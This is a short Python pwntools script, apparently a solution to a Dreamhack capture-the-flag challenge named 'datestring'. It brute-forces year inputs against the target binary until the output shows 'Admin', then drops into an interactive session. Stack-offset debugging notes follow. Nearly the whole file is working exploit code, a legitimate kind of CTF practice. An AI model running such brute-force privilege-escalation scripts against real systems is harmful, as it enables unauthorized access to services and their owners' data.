from pwn import *

#context.log_level = 'debug'
  
for year in range(77777777, 77778777):
    p = process('./datestring')
    #p = remote('host3.dreamhack.games', 23702)
    
    p.sendlineafter(b"Year: ", str(year).encode())
    p.sendlineafter(b"Month: ", "12".encode())
    p.sendlineafter(b"Day: ", "25".encode())
    p.sendlineafter(b"Hour: ", "12".encode())
    p.sendlineafter(b"Minute: ", "12".encode())
    p.sendlineafter(b"Second: ", "12".encode())

    decode = p.recv(1024)

    if decode is not None and b'Admin' in decode:
        print("Found -> ", year, "\nText ->", decode)
        p.interactive()
        break
    
    p.close()
    
# Formatted date: Sun Dec 25 12:12:12 2022\n

'''
v13 -> [rbp-0x50] -> 11     | main + 838
v12 -> [rbp-0x54] -> 25     | main + 846
v15 -> [rbp-0x48] -> 0      | main + 851
v17 -> [rbp-0x4]  -> !0     | main + 856

[rip+0x973] # 0x2081 (formmm)

2022 12 25
'''